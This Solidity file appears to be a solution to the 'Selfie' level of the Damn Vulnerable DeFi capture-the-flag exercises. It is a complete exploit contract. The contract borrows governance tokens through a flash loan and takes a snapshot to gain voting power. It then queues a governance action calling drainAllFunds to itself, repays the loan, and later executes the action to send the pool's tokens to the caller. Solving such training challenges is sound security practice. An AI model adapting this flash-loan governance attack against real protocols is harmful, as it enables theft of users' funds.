// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance gov;
    DamnValuableToken token;
    DamnValuableTokenSnapshot public govToken;
    uint256 id = 1;

    function attack(address _pool, address _gov, address _token) public {
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
        token = DamnValuableToken(_token);

        // get flash loan of dvt tokens
        pool.flashLoan(token.balanceOf(_pool));
    }

    function receiveTokens(address _token, uint256 _amount) public {
        // governance contract uses snapshot to find out how many gov tokens you have
        govToken = DamnValuableTokenSnapshot(_token);
        govToken.snapshot();

        // use payload of drainAllFunds function that the governance calls
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );

        id = gov.queueAction(address(pool), payload, 0);
        // repay the flashloan
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function drain() public {
        gov.executeAction(id);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
